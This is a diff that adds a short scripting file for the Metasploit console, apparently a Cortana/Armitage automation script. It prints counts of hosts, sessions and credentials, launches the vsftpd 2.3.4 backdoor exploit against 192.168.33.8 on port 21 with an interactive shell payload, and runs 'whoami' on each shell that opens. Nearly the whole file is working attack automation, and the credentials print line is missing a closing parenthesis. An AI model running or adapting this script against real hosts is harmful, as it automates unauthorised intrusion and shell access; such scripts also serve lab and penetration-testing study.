@@ -1,0 +1,30 @@
+on ready {
+	println("Hello Metasploit!");
+	println("Hosts:			" . size(hosts()));
+	println("Sessions:		" . size(sessions()));
+	println("Services:		" . size(services()));
+	println("Credentials: 	" . size(credentials());
+}
+
+on console {
+	println("$2 => $3");
+}
+
+on shell_whoami {
+	println("[ $+ $1 $+ ] I am: $3");
+}
+
+on session_open {
+	if (!-isshell $1) {
+		return;
+	}
+	s_cmd($1, "whoami");
+}
+
+$console = console();
+cmd($console, "use exploit/unix/ftp/vsftpd_234_backdoor");
+cmd_set($console, %(RHOST => "192.168.33.8",
+					RPORT => "21",
+					TARGET => "0",
+					PAYLOAD => "cmd/unix/interact"));
+cmd($console, "exploit -j");
